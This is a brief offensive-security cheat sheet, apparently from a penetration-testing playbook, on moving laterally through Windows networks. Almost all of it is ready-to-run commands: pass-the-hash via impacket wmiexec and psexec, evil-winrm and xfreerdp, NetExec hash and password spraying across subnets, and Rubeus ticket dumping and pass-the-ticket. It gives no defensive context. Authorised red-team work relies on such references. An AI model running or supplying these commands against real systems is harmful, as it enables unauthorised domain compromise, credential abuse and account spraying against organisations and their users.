# Windows Lateral Movement

**Tags:** #lateral-movement #windows #pth #wmi #winrm
**Full Playbook:** [[06-Lateral-Movement/INDEX]]

---

## Quick Reference

```bash
# WMIExec (stealthy — no service)
impacket-wmiexec $DOMAIN/$USER@$TARGET -hashes :HASH

# WinRM (requires WinRM open)
evil-winrm -i $TARGET -u $USER -H HASH

# PSExec (noisy — creates service)
impacket-psexec $DOMAIN/$USER@$TARGET -hashes :HASH

# NetExec spray
nxc smb "$SUBNET" -u "$USER" -H "$NTLM_HASH" --local-auth

# Spray credentials
read -rsp 'Approved spray candidate: ' SPRAY_PASS; printf '\n'
nxc smb "$SUBNET" -u users.txt -p "$SPRAY_PASS" --no-bruteforce
unset SPRAY_PASS

# RDP
xfreerdp /v:$TARGET /u:$USER /pth:HASH /d:$DOMAIN

# Pass-the-Ticket
.\Rubeus.exe dump /nowrap
.\Rubeus.exe ptt /ticket:BASE64_TICKET
impacket-psexec $DOMAIN/Administrator@$TARGET -k -no-pass
```

See full guide: [[06-Lateral-Movement/INDEX]]
